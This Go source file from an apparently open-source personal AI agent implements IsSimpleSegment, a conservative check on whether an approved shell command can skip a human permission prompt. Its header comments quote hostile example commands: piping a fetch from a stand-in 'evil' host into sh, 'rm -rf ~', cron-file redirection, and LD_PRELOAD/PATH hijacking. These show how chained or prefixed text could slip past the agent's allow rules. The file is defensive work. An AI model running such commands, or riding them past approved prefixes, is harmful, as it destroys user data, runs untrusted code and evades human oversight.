// Omnipus - Ultra-lightweight personal AI agent
// License: MIT
// Copyright (c) 2026 Omnipus contributors

// This file closes three related ADR-092 code-review findings (post-merge
// security review, 2026-09-23) that all trace to the same root cause: a
// segment whose resolved HEAD matches an ALLOW rule (or a D4 prefix grant)
// was treated as fully, silently settled without checking what ELSE the
// segment's text contains.
//
//   - CRITICAL: a D4 prefix grant recorded for "git status" also silently
//     approved "git status && curl evil | sh", "git status ; rm -rf ~",
//     "git status > /etc/cron.d/x" — chained/redirected/substituted text
//     riding along after (or around) the granted head.
//   - HIGH: the same grant also matched "./git status" (a directory-
//     stripped, "normalised" head) and "LD_PRELOAD=/tmp/evil.so git status"
//     / "PATH=/tmp/evil git status" (an env-assignment prefix that changes
//     what the REAL, correctly-resolved git binary does once exec'd).
//   - HIGH: a D3 operator ALLOW rule's FullyAllowed() fast path (which
//     skips the human prompt entirely) had the identical blind spot for
//     command/process substitution, subshells, redirection, and
//     env-assignment prefixes.
//
// IsSimpleSegment is the ONE gate both call sites now share (ADR-092 D3's
// "no new parser" principle applied to this fix too — one definition, not
// two that can drift): it decides whether a segment is shaped like a bare,
// unadorned command a human's earlier "prefix" Allow, or an operator's
// ALLOW rule, may settle without looking at it again.
package shellrule

import "strings"

// simpleSegmentMetachars are the shell constructs that disqualify a segment
// from ever being judged "simple": command substitution (`$(...)`),
// parameter/legacy substitution and process substitution all contain at
// least one of `(` or “ ` “; redirection uses `<`/`>`; a subshell or
// brace-group uses `(`/`)`. A segment containing ANY of these bytes is
// judged conservatively as "not simple" regardless of what its resolved
// head turns out to be — the same fail-closed direction every other
// blind-spot check in this package takes (classifySegment's own doc
// comment: a false block costs one extra prompt, a false pass is the
// vulnerability class this file exists to close).
const simpleSegmentMetachars = "()<>`"

// IsSimpleSegment reports whether seg is shaped like a single, unadorned
// command that:
//
//   - a D3 operator ALLOW rule's fast path (CommandVerdict.FullyAllowed,
//     which skips the human prompt entirely), or
//   - a D4 "prefix" scope Allow grant (pkg/tools/shell_permission_mode.go
//     ::bashPrefixMatchInputs)
//
// may settle without a human looking at the actual text again:
//
//   - no command/process substitution, backtick, subshell, or grouping —
//     any of "()<>`" anywhere in the segment text disqualifies it;
//   - POSIX only: no leading `VAR=value` environment-assignment prefix.
//     "LD_PRELOAD=/tmp/evil.so ls" and "PATH=/tmp/evil:$PATH ls" resolve to
//     the REAL, correctly-resolved `ls` — the attack is the environment the
//     shell hands it, which a resolved-binary check alone can never see;
//   - Windows: also no chain/separator metacharacter (";", "&", "|", "\n",
//     "\r"). FR-041 already notes Windows has no per-segment parser — when
//     Platform==WindowsPlatform, EvaluateCommand skips the Segmenter
//     entirely and judges the WHOLE command as one segment, so a compound
//     PowerShell/cmd line reaching this check must be judged as one unit
//     and any of these bytes disqualifies it.
//
// This is a deliberately conservative, text-only scan: it does not use a
// Segmenter or HeadResolver and never claims to parse the segment, only to
// refuse the shapes that are unsafe to fully-allow. A false "not simple" on
// an unusual-looking but benign command (e.g. a commit message containing a
// literal "(") costs one extra prompt; a false "simple" on a dangerous one
// is the vulnerability class this file exists to close — the asymmetry is
// intentional, matching dangerousBraceExpansionHead's own documented
// trade-off in pkg/tools/shell_subst_guard.go.
func IsSimpleSegment(seg string, platform Platform) bool {
	if strings.ContainsAny(seg, simpleSegmentMetachars) {
		return false
	}
	if platform == WindowsPlatform {
		return !strings.ContainsAny(seg, ";&|\n\r")
	}
	return !leadingAssignment(seg)
}

// leadingAssignment reports whether seg's first shell word is a `VAR=value`
// environment assignment. Uses this package's own whitespace tokeniser
// (tokenizeWords) rather than a second ad hoc scan — assignmentRe/
// isAssignment (tokenize.go) already define what an assignment token looks
// like; this is the same test splitHeadArgs already applies when skipping
// leading assignments to find the argument words, reused here to answer a
// different question (does one exist at all, not where do the args start).
func leadingAssignment(seg string) bool {
	words := tokenizeWords(strings.TrimLeft(seg, " \t"))
	return len(words) > 0 && isAssignment(words[0])
}
